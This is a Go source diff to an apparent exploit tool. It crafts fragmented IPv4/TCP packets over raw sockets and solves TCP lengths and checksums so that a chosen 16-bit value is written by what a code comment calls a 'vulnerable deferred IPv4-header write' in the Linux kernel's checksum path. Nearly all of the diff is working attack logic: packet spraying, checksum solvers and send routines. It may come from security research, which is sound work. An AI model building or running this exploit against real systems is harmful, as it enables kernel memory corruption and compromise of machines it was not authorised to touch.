@@ -100,7 +100,15 @@ func runEgress(c cfg) error {
 	if maxChunk < 8 {
 		return fmt.Errorf("interface MTU %d is too small for %d-tag IPv4 fragments", ifi.MTU, c.vlanTags)
 	}
-	fragments := (c.egressRest + maxChunk - 1) / maxChunk
+	payloadLen := c.head + c.egressRest
+	if c.tcpValid {
+		payloadLen = egressTCPValidPayloadLen(src, dst, uint16(c.csumWord))
+		if payloadLen < 60 {
+			return fmt.Errorf("no TCP payload length can produce deferred checksum word 0x%04x", c.csumWord)
+		}
+	}
+	payloadRest := payloadLen - c.head
+	fragments := (payloadRest + maxChunk - 1) / maxChunk
 	proto := byte(ipProtoRaw)
 	switch c.transport {
 	case "udp":
@@ -109,16 +117,19 @@ func runEgress(c cfg) error {
 		proto = ipProtoTCP
 	}
 	adjustIP := egressAdjustmentIPOffset(c.transport)
+	if c.tcpValid {
+		adjustIP = -1
+	}
 	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head spray=%d fill=0x%02x\n",
 		ifi.Name, ifi.MTU, src, ifi.HardwareAddr, dst, nextHop, nextMAC,
-		routeIPv4(route.dest), route.prefix, c.transport, c.head+c.egressRest, fragments,
+		routeIPv4(route.dest), route.prefix, c.transport, payloadLen, fragments,
 		c.egressSpray, c.egressFill)
 
 	samples := make([]egressPrepared, 0, c.count)
 	expected := make(map[uint16]struct{}, c.count)
 	for sample := 0; sample < c.count; sample++ {
 		id := uint16(ipID + sample)
-		payload := make([]byte, c.head+c.egressRest)
+		payload := make([]byte, payloadLen)
 		for i := range payload {
 			payload[i] = 0x11
 		}
@@ -132,7 +143,14 @@ func runEgress(c cfg) error {
 				payload[i] = marker
 			}
 		}
-		if !egressSolveAt(payload, id, src, dst, proto, c.csumOffset, uint16(c.csumWord), adjustIP) {
+		if c.tcpValid {
+			egressTCPChecksums(payload, src, dst)
+			pkt := egressFragment(0, false, payload, id, src, dst, proto)
+			forwardTTL(pkt)
+			if got := csumFold(csumPartial(pkt)); got != uint16(c.csumWord) {
+				return fmt.Errorf("sample %d: valid TCP geometry produced checksum word 0x%04x, want 0x%04x", sample, got, c.csumWord)
+			}
+		} else if !egressSolveAt(payload, id, src, dst, proto, c.csumOffset, uint16(c.csumWord), adjustIP) {
 			return fmt.Errorf("sample %d: solver found no adjustment for checksum word 0x%04x", sample, c.csumWord)
 		}
 		samples = append(samples, egressPrepared{id: id, payload: payload})
@@ -193,6 +211,60 @@ func putTCPHeader(dst []byte, srcPort, dstPort uint16) {
 	// stack validates this zero checksum. The malformed checksum is deliberate:
 	// making it valid would constrain the same sum used for the vulnerable
 	// deferred IPv4-header write.
+}
+
+func egressTCPChecksums(payload []byte, src, dst net.IP) {
+	// The post-mutation checksum is part of the pre-mutation TCP payload, so
+	// complete it first and then checksum the full original segment.
+	binary.BigEndian.PutUint16(payload[56:58], 0)
+	binary.BigEndian.PutUint16(payload[56:58], tcpIPv4Checksum(src, dst, payload[40:]))
+	binary.BigEndian.PutUint16(payload[16:18], 0)
+	binary.BigEndian.PutUint16(payload[16:18], tcpIPv4Checksum(src, dst, payload))
+}
+
+func tcpIPv4Checksum(src, dst net.IP, segment []byte) uint16 {
+	var sum uint32
+	add := func(data []byte) {
+		for len(data) >= 2 {
+			sum += uint32(binary.BigEndian.Uint16(data[:2]))
+			data = data[2:]
+		}
+		if len(data) == 1 {
+			sum += uint32(data[0]) << 8
+		}
+	}
+	add(src.To4())
+	add(dst.To4())
+	sum += ipProtoTCP
+	sum += uint32(len(segment))
+	add(segment)
+	for sum > 0xffff {
+		sum = (sum & 0xffff) + (sum >> 16)
+	}
+	return ^uint16(sum)
+}
+
+func egressTCPValidPayloadLen(src, dst net.IP, desired uint16) int {
+	// A valid IPv4 header sums to 0xffff. A checksum-valid TCP segment's
+	// folded sum is the complement of its pseudo-header sum. Consequently,
+	// skb_checksum_help's host-endian result over IPv4+TCP is the byte-swapped
+	// folded pseudo-header sum. TCP length is therefore a free 16-bit solver.
+	for length := 60; length <= 65515; length++ {
+		var sum uint32
+		for _, ip := range []net.IP{src.To4(), dst.To4()} {
+			sum += uint32(binary.BigEndian.Uint16(ip[0:2]))
+			sum += uint32(binary.BigEndian.Uint16(ip[2:4]))
+		}
+		sum += ipProtoTCP
+		sum += uint32(length)
+		for sum > 0xffff {
+			sum = (sum & 0xffff) + (sum >> 16)
+		}
+		if bits.ReverseBytes16(uint16(sum)) == desired {
+			return length
+		}
+	}
+	return 0
 }
 
 func egressAdjustmentIPOffset(transport string) int {
@@ -398,9 +470,14 @@ func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareA
 	if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(first, srcMAC, dstMAC, vlanTags), true, uint16(l2LenForTags(vlanTags)), uint16(csumOffset)); err != nil {
 		return fmt.Errorf("send head fragment: %w", err)
 	}
-	adjustPayload := adjustIP - ipLen
-	fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment_ip_offset=%d adjustment=%02x%02x\n",
-		id, head, len(payload)-head, adjustIP, payload[adjustPayload], payload[adjustPayload+1])
+	if adjustIP >= ipLen {
+		adjustPayload := adjustIP - ipLen
+		fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment_ip_offset=%d adjustment=%02x%02x\n",
+			id, head, len(payload)-head, adjustIP, payload[adjustPayload], payload[adjustPayload+1])
+	} else {
+		fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment=dual-valid-tcp-checksums\n",
+			id, head, len(payload)-head)
+	}
 	return nil
 }
 
